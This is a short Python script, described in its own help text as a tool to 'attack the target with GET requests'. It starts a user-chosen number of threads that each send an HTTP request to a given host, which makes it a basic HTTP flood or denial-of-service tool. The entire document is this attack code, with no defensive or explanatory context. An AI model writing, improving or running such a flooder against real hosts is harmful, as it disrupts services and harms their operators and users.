#!/usr/bin/env python
# -*- encoding: utf-8 -*-
import argparse, urllib.request, time
from threading import Thread

host, threads = [None , 0]

def main():
	parser = argparse.ArgumentParser(description='Attack the target with GET requests')
	parser.add_argument('--host', help='The target host')
	parser.add_argument('--threads', type=int, help='Number of attack threads')
	parsed = parser.parse_args()
	
	if parsed.host:
		host = parsed.host
	else:
		host = input('Host: ')

	if parsed.threads:
		threads = parsed.threads
	else:
		threads = int(input('Number of Threads: '))

	try:
		attack(host, threads)
	except:
		print('Cannot create a new thread...')

def connect(host,i=0):
	try:
		response = urllib.request.urlopen('http://%s' % (host)).read()
	except:
		print('Cannot connect thread #%d to %s...' % (i, host))

def attack(host, threads):
	print('\nAttacking %s with %d threads...\n' % (host, threads))
	for i in range(threads):
		t = Thread(target=connect, args=(host,i,))
		print('Connecting thread #%d...' % i)
		t.start()
		time.sleep(0.01)
	
if __name__ == '__main__':
	main()
